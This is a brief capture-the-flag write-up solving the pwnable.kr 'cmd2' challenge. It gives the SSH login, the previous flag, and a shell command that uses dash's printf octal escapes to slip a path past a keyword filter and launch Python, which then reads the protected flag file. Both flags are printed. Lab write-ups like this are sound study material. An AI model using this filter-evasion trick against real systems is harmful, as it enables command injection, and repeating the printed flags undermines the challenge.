Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1 - flag: mommy now I get what PATH environment is for :))

=== solve ===
keyword: "printf dash hexadecimal" + "bug" =>https://bugs.launchpad.net/ubuntu/+source/dash/+bug/1499473

```sh
mkdir /tmp/edisc-cmd2
cd /tmp/edisc-cmd2
ln -s $(which python) py

/home/cmd2/cmd2 "\$(echo '.\057py')"
Python 2.7.12 (default, Mar  1 2021, 11:38:31) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> open('/home/cmd2/flag')
<open file '/home/cmd2/flag', mode 'r' at 0x7f6661923540>
>>> r = open('/home/cmd2/flag')
>>> r.read()
'FuN_w1th_5h3ll_v4riabl3s_haha\n'
```

**flag: FuN_w1th_5h3ll_v4riabl3s_haha** 